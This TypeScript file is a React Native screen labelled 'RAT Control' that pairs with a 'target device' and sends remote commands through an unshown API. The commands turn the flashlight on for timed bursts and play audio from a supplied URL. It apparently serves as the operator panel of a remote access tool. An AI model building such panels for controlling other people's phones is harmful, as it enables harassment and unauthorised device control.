import React, { useState, useEffect, useCallback } from 'react';
import {
  View,
  Text,
  StyleSheet,
  TouchableOpacity,
  Alert,
  StatusBar,
  ScrollView,
  TextInput,
  ActivityIndicator,
  Modal,
} from 'react-native';
import { LinearGradient } from 'expo-linear-gradient';
import { Ionicons } from '@expo/vector-icons';
import { COLORS, GRADIENTS } from '../utils/colors';
import {
  ratStartPairing,
  ratPairingStatus,
  ratGetDevices,
  ratRemoveDevice,
  ratFlashOn,
  ratFlashOff,
  ratBacksoundOn,
  ratBacksoundOff,
} from '../services/api';

interface RatScreenProps {
  navigation: any;
  route: { params: { sessionKey: string } };
}

export const RatScreen: React.FC<RatScreenProps> = ({ navigation, route }) => {
  const { sessionKey } = route.params;

  const [devices, setDevices] = useState<any[]>([]);
  const [isLoading, setIsLoading] = useState(false);
  const [showPairingModal, setShowPairingModal] = useState(false);
  const [pairingId, setPairingId] = useState('');
  const [pairingStatus, setPairingStatus] = useState('waiting');

  const [selectedDevice, setSelectedDevice] = useState<any>(null);
  const [showControlModal, setShowControlModal] = useState(false);
  const [backsoundUrl, setBacksoundUrl] = useState('');

  const fetchDevices = useCallback(async () => {
    setIsLoading(true);
    try {
      const response = await ratGetDevices(sessionKey);
      if (Array.isArray(response)) setDevices(response);
      else if (response.devices) setDevices(response.devices);
    } catch (error) {
      console.log('Failed to fetch devices');
    } finally {
      setIsLoading(false);
    }
  }, [sessionKey]);

  useEffect(() => {
    fetchDevices();
  }, [fetchDevices]);

  const handleStartPairing = async () => {
    try {
      const response = await ratStartPairing(sessionKey);
      if (response.pairingId) {
        setPairingId(response.pairingId);
        setPairingStatus('waiting');
        setShowPairingModal(true);

        // Poll status every 3s
        const poll = setInterval(async () => {
          try {
            const status = await ratPairingStatus(sessionKey, response.pairingId);
            if (status.status === 'connected') {
              setPairingStatus('connected');
              clearInterval(poll);
              setTimeout(() => {
                setShowPairingModal(false);
                fetchDevices();
              }, 1500);
            }
          } catch {}
        }, 3000);

        setTimeout(() => clearInterval(poll), 300000);
      } else {
        Alert.alert('Error', 'Failed to start pairing.');
      }
    } catch (error) {
      Alert.alert('Error', 'Connection failed.');
    }
  };

  const handleRemove = (token: string) => {
    Alert.alert('Remove Device', 'Remove this device?', [
      { text: 'Cancel', style: 'cancel' },
      {
        text: 'Remove',
        style: 'destructive',
        onPress: async () => {
          try {
            await ratRemoveDevice(sessionKey, token);
            fetchDevices();
          } catch {
            Alert.alert('Error', 'Failed to remove device.');
          }
        },
      },
    ]);
  };

  const handleFlash = async () => {
    if (!selectedDevice) return;
    try {
      await ratFlashOn(sessionKey, selectedDevice.token, 300, 10000);
      Alert.alert('Success', 'Flash activated for 10s.');
    } catch {
      Alert.alert('Error', 'Failed to activate flash.');
    }
  };

  const handleFlashOff = async () => {
    if (!selectedDevice) return;
    try {
      await ratFlashOff(sessionKey, selectedDevice.token);
      Alert.alert('Success', 'Flash stopped.');
    } catch {
      Alert.alert('Error', 'Failed to stop flash.');
    }
  };

  const handleBacksound = async () => {
    if (!selectedDevice || !backsoundUrl.trim()) {
      Alert.alert('Error', 'Please enter audio URL.');
      return;
    }
    try {
      await ratBacksoundOn(sessionKey, selectedDevice.token, backsoundUrl.trim(), true);
      Alert.alert('Success', 'Backsound playing.');
    } catch {
      Alert.alert('Error', 'Failed to play backsound.');
    }
  };

  const handleBacksoundOff = async () => {
    if (!selectedDevice) return;
    try {
      await ratBacksoundOff(sessionKey, selectedDevice.token);
      Alert.alert('Success', 'Backsound stopped.');
    } catch {
      Alert.alert('Error', 'Failed to stop backsound.');
    }
  };

  return (
    <View style={styles.container}>
      <StatusBar barStyle="light-content" backgroundColor={COLORS.primaryDark} />
      <LinearGradient colors={GRADIENTS.dark} style={styles.background}>
        <View style={styles.header}>
          <TouchableOpacity onPress={() => navigation.goBack()} style={styles.backButton}>
            <Ionicons name="arrow-back" size={24} color={COLORS.primaryWhite} />
          </TouchableOpacity>
          <Text style={styles.headerTitle}>RAT Control</Text>
          <TouchableOpacity onPress={handleStartPairing} style={styles.addButton}>
            <Ionicons name="add" size={24} color={COLORS.accentRed} />
          </TouchableOpacity>
        </View>

        <ScrollView contentContainerStyle={styles.scrollContent}>
          <LinearGradient colors={GRADIENTS.primary} style={styles.heroCard}>
            <View style={styles.heroIcon}>
              <Ionicons name="phone-portrait" size={40} color={COLORS.primaryWhite} />
            </View>
            <Text style={styles.heroTitle}>Remote Admin Tools</Text>
            <Text style={styles.heroSubtitle}>
              {devices.length} device{devices.length !== 1 ? 's' : ''} connected
            </Text>
          </LinearGradient>

          <TouchableOpacity style={styles.pairButton} onPress={handleStartPairing}>
            <LinearGradient colors={GRADIENTS.primary} style={styles.pairGradient}>
              <Ionicons name="add-circle" size={20} color={COLORS.primaryWhite} />
              <Text style={styles.pairText}>START PAIRING</Text>
            </LinearGradient>
          </TouchableOpacity>

          {isLoading && devices.length === 0 ? (
            <ActivityIndicator color={COLORS.accentRed} style={{ marginTop: 40 }} />
          ) : devices.length === 0 ? (
            <View style={styles.emptyState}>
              <Ionicons name="phone-portrait-outline" size={64} color={COLORS.accentGrey} />
              <Text style={styles.emptyText}>No devices connected</Text>
              <Text style={styles.emptySubtext}>
                Start pairing to add a device
              </Text>
            </View>
          ) : (
            devices.map((device, index) => (
              <View key={index} style={styles.deviceCard}>
                <View style={styles.deviceHeader}>
                  <View style={styles.deviceIcon}>
                    <Ionicons name="phone-portrait" size={24} color={COLORS.accentRed} />
                  </View>
                  <View style={styles.deviceInfo}>
                    <Text style={styles.deviceName}>
                      {device.deviceInfo?.model || 'Unknown Device'}
                    </Text>
                    <Text style={styles.deviceToken} numberOfLines={1}>
                      {device.token?.substring(0, 16)}...
                    </Text>
                  </View>
                  <View style={styles.onlineBadge}>
                    <View style={styles.onlineDot} />
                    <Text style={styles.onlineText}>ONLINE</Text>
                  </View>
                </View>

                <View style={styles.deviceActions}>
                  <TouchableOpacity
                    style={styles.controlBtn}
                    onPress={() => {
                      setSelectedDevice(device);
                      setShowControlModal(true);
                    }}
                  >
                    <Ionicons name="settings" size={16} color={COLORS.primaryWhite} />
                    <Text style={styles.controlBtnText}>CONTROL</Text>
                  </TouchableOpacity>

                  <TouchableOpacity
                    style={styles.removeBtn}
                    onPress={() => handleRemove(device.token)}
                  >
                    <Ionicons name="trash" size={16} color={COLORS.dangerRed} />
                    <Text style={styles.removeBtnText}>REMOVE</Text>
                  </TouchableOpacity>
                </View>
              </View>
            ))
          )}
        </ScrollView>

        {/* Pairing Modal */}
        <Modal visible={showPairingModal} transparent animationType="fade">
          <View style={styles.modalOverlay}>
            <View style={styles.modalContent}>
              <View style={styles.pairingIconContainer}>
                <Ionicons
                  name={pairingStatus === 'connected' ? 'checkmark-circle' : 'link'}
                  size={50}
                  color={pairingStatus === 'connected' ? COLORS.successGreen : COLORS.primaryWhite}
                />
              </View>
              <Text style={styles.pairingTitle}>
                {pairingStatus === 'connected' ? 'Connected!' : 'Waiting for Device'}
              </Text>
              <Text style={styles.pairingSubtitle}>
                {pairingStatus === 'connected'
                  ? 'Device connected successfully'
                  : 'Enter this Pairing ID on the target device'}
              </Text>

              {pairingStatus !== 'connected' && (
                <View style={styles.codeContainer}>
                  <Text style={styles.codeText}>{pairingId}</Text>
                </View>
              )}

              <TouchableOpacity
                style={styles.closeModalBtn}
                onPress={() => setShowPairingModal(false)}
              >
                <Text style={styles.closeModalText}>CLOSE</Text>
              </TouchableOpacity>
            </View>
          </View>
        </Modal>

        {/* Control Modal */}
        <Modal visible={showControlModal} transparent animationType="slide">
          <View style={styles.modalOverlay}>
            <View style={styles.modalContent}>
              <Text style={styles.pairingTitle}>Device Control</Text>
              <Text style={styles.pairingSubtitle}>
                {selectedDevice?.deviceInfo?.model || 'Device'}
              </Text>

              <View style={styles.controlGrid}>
                <TouchableOpacity style={styles.controlAction} onPress={handleFlash}>
                  <Ionicons name="flash" size={24} color={COLORS.warningOrange} />
                  <Text style={styles.controlActionText}>Flash ON</Text>
                </TouchableOpacity>
                <TouchableOpacity style={styles.controlAction} onPress={handleFlashOff}>
                  <Ionicons name="flash-off" size={24} color={COLORS.accentGrey} />
                  <Text style={styles.controlActionText}>Flash OFF</Text>
                </TouchableOpacity>
              </View>

              <Text style={styles.inputLabel}>Backsound URL</Text>
              <TextInput
                style={styles.input}
                value={backsoundUrl}
                onChangeText={setBacksoundUrl}
                placeholder="https://example.com/audio.mp3"
                placeholderTextColor={COLORS.accentGrey}
                autoCapitalize="none"
              />

              <View style={styles.controlGrid}>
                <TouchableOpacity style={styles.controlAction} onPress={handleBacksound}>
                  <Ionicons name="musical-notes" size={24} color={COLORS.successGreen} />
                  <Text style={styles.controlActionText}>Play</Text>
                </TouchableOpacity>
                <TouchableOpacity style={styles.controlAction} onPress={handleBacksoundOff}>
                  <Ionicons name="stop-circle" size={24} color={COLORS.dangerRed} />
                  <Text style={styles.controlActionText}>Stop</Text>
                </TouchableOpacity>
              </View>

              <TouchableOpacity
                style={styles.closeModalBtn}
                onPress={() => setShowControlModal(false)}
              >
                <Text style={styles.closeModalText}>CLOSE</Text>
              </TouchableOpacity>
            </View>
          </View>
        </Modal>
      </LinearGradient>
    </View>
  );
};

const styles = StyleSheet.create({
  container: { flex: 1, backgroundColor: COLORS.primaryDark },
  background: { flex: 1 },
  header: {
    flexDirection: 'row',
    alignItems: 'center',
    paddingHorizontal: 16,
    paddingTop: 50,
    paddingBottom: 16,
  },
  backButton: {
    width: 44,
    height: 44,
    borderRadius: 12,
    backgroundColor: COLORS.glassColor,
    alignItems: 'center',
    justifyContent: 'center',
  },
  headerTitle: {
    flex: 1,
    fontSize: 18,
    fontWeight: 'bold',
    color: COLORS.primaryWhite,
    fontFamily: 'Orbitron',
    marginLeft: 12,
  },
  addButton: {
    width: 44,
    height: 44,
    borderRadius: 12,
    backgroundColor: 'rgba(220, 20, 60, 0.2)',
    alignItems: 'center',
    justifyContent: 'center',
  },
  scrollContent: { padding: 16, paddingBottom: 40 },
  heroCard: {
    borderRadius: 16,
    padding: 24,
    alignItems: 'center',
    marginBottom: 20,
  },
  heroIcon: {
    width: 80,
    height: 80,
    borderRadius: 40,
    backgroundColor: 'rgba(255, 255, 255, 0.2)',
    alignItems: 'center',
    justifyContent: 'center',
    marginBottom: 16,
  },
  heroTitle: {
    fontSize: 20,
    fontWeight: 'bold',
    color: COLORS.primaryWhite,
    fontFamily: 'Orbitron',
  },
  heroSubtitle: {
    fontSize: 14,
    color: 'rgba(255, 255, 255, 0.8)',
    fontFamily: 'ShareTechMono',
    marginTop: 8,
  },
  pairButton: { borderRadius: 12, overflow: 'hidden', marginBottom: 20 },
  pairGradient: {
    flexDirection: 'row',
    alignItems: 'center',
    justifyContent: 'center',
    paddingVertical: 14,
    gap: 8,
  },
  pairText: {
    color: COLORS.primaryWhite,
    fontSize: 16,
    fontWeight: 'bold',
    fontFamily: 'Orbitron',
  },
  emptyState: {
    alignItems: 'center',
    paddingVertical: 60,
  },
  emptyText: {
    color: COLORS.primaryWhite,
    fontSize: 18,
    fontFamily: 'Orbitron',
    marginTop: 16,
  },
  emptySubtext: {
    color: COLORS.accentGrey,
    fontSize: 14,
    fontFamily: 'ShareTechMono',
    marginTop: 8,
  },
  deviceCard: {
    backgroundColor: COLORS.cardDark,
    borderRadius: 16,
    padding: 16,
    marginBottom: 12,
    borderWidth: 1,
    borderColor: 'rgba(220, 20, 60, 0.2)',
  },
  deviceHeader: {
    flexDirection: 'row',
    alignItems: 'center',
    marginBottom: 16,
  },
  deviceIcon: {
    width: 44,
    height: 44,
    borderRadius: 22,
    backgroundColor: 'rgba(220, 20, 60, 0.2)',
    alignItems: 'center',
    justifyContent: 'center',
    marginRight: 12,
  },
  deviceInfo: { flex: 1 },
  deviceName: {
    color: COLORS.primaryWhite,
    fontSize: 15,
    fontWeight: 'bold',
    fontFamily: 'Orbitron',
  },
  deviceToken: {
    color: COLORS.accentGrey,
    fontSize: 11,
    fontFamily: 'ShareTechMono',
    marginTop: 2,
  },
  onlineBadge: {
    flexDirection: 'row',
    alignItems: 'center',
    backgroundColor: 'rgba(16, 185, 129, 0.2)',
    paddingHorizontal: 10,
    paddingVertical: 4,
    borderRadius: 12,
    gap: 6,
  },
  onlineDot: {
    width: 6,
    height: 6,
    borderRadius: 3,
    backgroundColor: COLORS.successGreen,
  },
  onlineText: {
    color: COLORS.successGreen,
    fontSize: 10,
    fontWeight: 'bold',
    fontFamily: 'Orbitron',
  },
  deviceActions: { flexDirection: 'row', gap: 12 },
  controlBtn: {
    flex: 1,
    flexDirection: 'row',
    alignItems: 'center',
    justifyContent: 'center',
    paddingVertical: 12,
    borderRadius: 10,
    borderWidth: 1,
    borderColor: 'rgba(220, 20, 60, 0.3)',
    gap: 6,
  },
  controlBtnText: {
    color: COLORS.primaryWhite,
    fontSize: 12,
    fontWeight: 'bold',
    fontFamily: 'Orbitron',
  },
  removeBtn: {
    flex: 1,
    flexDirection: 'row',
    alignItems: 'center',
    justifyContent: 'center',
    paddingVertical: 12,
    borderRadius: 10,
    backgroundColor: 'rgba(239, 68, 68, 0.2)',
    gap: 6,
  },
  removeBtnText: {
    color: COLORS.dangerRed,
    fontSize: 12,
    fontWeight: 'bold',
    fontFamily: 'Orbitron',
  },
  modalOverlay: {
    flex: 1,
    backgroundColor: 'rgba(0, 0, 0, 0.85)',
    justifyContent: 'center',
    padding: 24,
  },
  modalContent: {
    backgroundColor: COLORS.cardDarker,
    borderRadius: 24,
    padding: 24,
    borderWidth: 1,
    borderColor: 'rgba(220, 20, 60, 0.3)',
  },
  pairingIconContainer: {
    alignSelf: 'center',
    padding: 16,
    borderRadius: 50,
    backgroundColor: 'rgba(220, 20, 60, 0.1)',
    marginBottom: 16,
  },
  pairingTitle: {
    fontSize: 20,
    fontWeight: 'bold',
    color: COLORS.primaryWhite,
    fontFamily: 'Orbitron',
    textAlign: 'center',
  },
  pairingSubtitle: {
    color: COLORS.accentGrey,
    fontSize: 13,
    fontFamily: 'ShareTechMono',
    textAlign: 'center',
    marginTop: 8,
    marginBottom: 20,
  },
  codeContainer: {
    backgroundColor: COLORS.cardDark,
    borderRadius: 16,
    padding: 20,
    marginBottom: 20,
    borderWidth: 1,
    borderColor: 'rgba(220, 20, 60, 0.3)',
    alignItems: 'center',
  },
  codeText: {
    color: COLORS.primaryWhite,
    fontSize: 28,
    fontWeight: 'bold',
    letterSpacing: 3,
    fontFamily: 'Orbitron',
  },
  closeModalBtn: {
    backgroundColor: 'rgba(220, 20, 60, 0.3)',
    paddingVertical: 14,
    borderRadius: 12,
    alignItems: 'center',
    borderWidth: 1,
    borderColor: 'rgba(220, 20, 60, 0.5)',
  },
  closeModalText: {
    color: COLORS.primaryWhite,
    fontWeight: 'bold',
    fontFamily: 'Orbitron',
  },
  controlGrid: {
    flexDirection: 'row',
    gap: 12,
    marginBottom: 16,
  },
  controlAction: {
    flex: 1,
    alignItems: 'center',
    justifyContent: 'center',
    padding: 16,
    borderRadius: 12,
    backgroundColor: COLORS.cardDark,
    borderWidth: 1,
    borderColor: 'rgba(220, 20, 60, 0.2)',
    gap: 8,
  },
  controlActionText: {
    color: COLORS.primaryWhite,
    fontSize: 12,
    fontWeight: 'bold',
    fontFamily: 'Orbitron',
  },
  inputLabel: {
    color: COLORS.primaryWhite,
    fontSize: 14,
    fontFamily: 'ShareTechMono',
    marginBottom: 8,
  },
  input: {
    backgroundColor: COLORS.cardDark,
    borderRadius: 12,
    borderWidth: 1,
    borderColor: 'rgba(220, 20, 60, 0.3)',
    color: COLORS.primaryWhite,
    paddingHorizontal: 16,
    paddingVertical: 14,
    fontFamily: 'ShareTechMono',
    marginBottom: 16,
  },
});